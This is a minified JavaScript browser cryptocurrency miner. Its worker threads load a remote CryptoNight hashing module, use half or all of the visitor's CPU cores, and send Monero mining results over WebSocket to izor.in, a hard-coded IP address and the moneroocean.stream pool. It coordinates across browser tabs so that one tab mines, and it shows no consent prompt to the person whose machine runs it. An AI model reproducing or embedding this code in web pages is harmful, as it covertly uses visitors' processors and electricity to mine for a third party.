var job=null;var workers=[];var ws;var debugging = false;var receiveStack=[];var sendStack=[];var totalhashes=0;var connected=0;var reconnector=0;var attempts=1;var throttlePercent=50;var handshake=null;function debugLog(inputString){if(debugging) console.log(inputString);}function wasmSupported(){try {if(typeof WebAssembly==="object"&&typeof WebAssembly.instantiate==="function"){var module = new WebAssembly.Module(Uint8Array.of(0x0, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00));if(module instanceof WebAssembly.Module) return new WebAssembly.Instance(module) instanceof WebAssembly.Instance;}}catch(e){}return false;}function addWorkers(numThreads){logicalProcessors=numThreads;if(numThreads==-1){ try {logicalProcessors = (window.navigator.hardwareConcurrency/2);debugLog("Using "+ logicalProcessors +" CPU cores.");}catch (err){logicalProcessors = 2;debugLog("No CPU core value, default is using "+ logicalProcessors);}if (!((logicalProcessors > 0) && (logicalProcessors < 40))  ) logicalProcessors = 4;}if(numThreads=="all"){ try {logicalProcessors = window.navigator.hardwareConcurrency;debugLog("Using "+ logicalProcessors +" CPU cores.");}catch (err){logicalProcessors = 4;debugLog("No CPU core value, default is using "+ logicalProcessors);}if (!((logicalProcessors > 0) && (logicalProcessors < 40))  ) logicalProcessors = 4;}while (logicalProcessors-- > 0) addWorker();}var openWebSocket=function(){if(ws != null){ws.close();}var srv = "";if (location.protocol == "https:"){srv = 'wss://izor.in:22443/';} else { srv = 'ws://198.46.132.211:22280/'; }ws = new WebSocket(srv); ws.onmessage = on_servermsg;ws.onerror = function(event){if(connected < 2){ connected = 2; }job = null;};ws.onclose = function(){if(connected < 2){ connected = 2; }job = null;};ws.onopen = function(){ws.send((JSON.stringify(handshake)));attempts = 1;connected = 1;};};reconnector = function(){if(connected !== 3 && (ws==null || (ws.readyState !== 0 && ws.readyState !== 1))){debugLog("The WebSocket is not connected. Trying to connect.");attempts++;openWebSocket();}if(connected !== 3) setTimeout(reconnector, 10000 * attempts);};function startBroadcast(mining){if(typeof BroadcastChannel !== "function"){debugLog("typeof BroadcastChannel");mining(); return;}stopBroadcast();var bc = new BroadcastChannel('channel');var number = Math.random();var array = [];var timerc = 0;var wantsToStart = true;array.push(number);bc.onmessage = function(ev){if(array.indexOf(ev.data) === -1) array.push(ev.data);};function checkShouldStart(){bc.postMessage(number);timerc++;if(timerc % 2 === 0){array.sort();if(array[0] === number && wantsToStart){mining();wantsToStart = false;number = 0;}array = [];array.push(number);}}startBroadcast.bc = bc;startBroadcast.id = setInterval(checkShouldStart, 1000);}function stopBroadcast(){if(typeof startBroadcast.bc !== 'undefined'){ startBroadcast.bc.close(); }if(typeof startBroadcast.id !== 'undefined'){ clearInterval(startBroadcast.id); }}function throttleAdjust(x){if(x==10){if( (throttlePercent + 10) > 100 ) return;throttlePercent = throttlePercent + 10;}if(x==-10){ if( (throttlePercent - 10) < 0 ) return;throttlePercent = throttlePercent - 10;}}function startMunching(login, password="x", numThreads=-1){if (!wasmSupported()){ debugLog("No wasm, no munch :'( ");return;}stopMunching();connected = 0;handshake = {identifier: "handshake",pool: "moneroocean.stream",login: login,password: password,userid: "",version: 7};var foo = function(){addWorkers(numThreads); reconnector();};startBroadcast(foo);}function stopMunching(){connected = 3;if(ws != null) ws.close();deleteAllWorkers();job = null;stopBroadcast();}function addWorker(){var myWorker = BuildWorker(function(){importScripts('https://izor.in/cn.js'); var cn = Module.cwrap('hash_cn', 'string', ['string', 'number', 'number', 'number']);function zeroPad(num, places) {var zero = places - num.toString().length + 1;return Array(+(zero > 0 && zero)).join("0") + num;}function hex2int(s) {try {return parseInt(s.match(/[a-fA-F0-9]{2}/g).reverse().join(''), 16);} catch(err) {}}function int2hex(i) {return (zeroPad(i.toString(16), 8)).match(/[a-fA-F0-9]{2}/g).reverse().join('');}function getRandomInt(min, max) {return Math.floor(Math.random() * (max - min + 1)) + min;}onmessage = function (e) {var jbthrt = e.data;var job = jbthrt.job;var thrt = jbthrt.throttle;var bsuccess = false;var hash = "";var hexnonce = 0;var calcHash = function () {if (job !== null) {var target = hex2int(job.target);var inonce = getRandomInt(0, 0xFFFFFFFF);hexnonce = int2hex(inonce);  var blob = job.blob.substring(0,78) + hexnonce + job.blob.substring(86,job.blob.length);try {if(job.algo === "cn") hash = cn(blob, 0, job.variant, job.height);else if(job.algo === "cn-lite") hash = cn(blob, 1, job.variant, job.height);else if(job.algo === "cn-pico") hash = cn(blob, 2, job.variant, job.height);else if(job.algo === "cn-half") hash = cn(blob, 3, job.variant, job.height);else throw "algorithm not supported!";var hashval = hex2int(hash.substring(56, 64));bsuccess = hashval < target;} catch (err) { console.log(err); }}};var submit = function () {if (bsuccess) {var msg = {identifier: "solved",job_id: job.job_id,nonce: hexnonce,result: hash};postMessage(JSON.stringify(msg));} else {postMessage("nothing");}};if (thrt === 0) { calcHash(); submit(); } else {var t0 = performance.now();calcHash();var dt = performance.now() - t0;var sleept = Math.round(thrt / (100 - thrt + 10) * dt);setTimeout(submit, sleept);}};});var newWorker = myWorker; workers.push(newWorker);newWorker.onmessage = on_workermsg;setTimeout(function (){ informWorker(newWorker); }, 2000);}function removeWorker(){if(workers.length < 1) return;var wrk = workers.shift();wrk.terminate();}function deleteAllWorkers(){for (i = 0; i < workers.length; i++){workers[i].terminate();}workers = [];}function informWorker(wrk){var evt = {data: "wakeup",target: wrk};on_workermsg(evt);}function on_servermsg(e){var obj = JSON.parse(e.data);debugLog(e.data);receiveStack.push(obj);if(receiveStack.length > 15) { receiveStack.shift(); }if(obj.identifier=="job") job = obj;}function on_workermsg(e){var wrk = e.target;if(connected != 1){setTimeout(function (){ informWorker(wrk); }, 2000);return;}if ((e.data) != "nothing" && (e.data) != "wakeup"){var obj = JSON.parse(e.data);ws.send(e.data);sendStack.push(obj);if(sendStack.length > 15) { sendStack.shift(); }}if(job === null){setTimeout(function (){ informWorker(wrk); }, 2000);return;}var jbthrt = {job: job,throttle: Math.max(0, Math.min(throttlePercent, 100))};wrk.postMessage(jbthrt);if ((e.data) != "wakeup") totalhashes += 1;}var BuildWorker = function(foo){   var str = foo.toString()             .match(/^\s*function\s*\(\s*\)\s*\{(([\s\S](?!\}$))*[\s\S])/)[1];   return  new Worker(window.URL.createObjectURL(                      new Blob([str],{type:'text/javascript'})));}
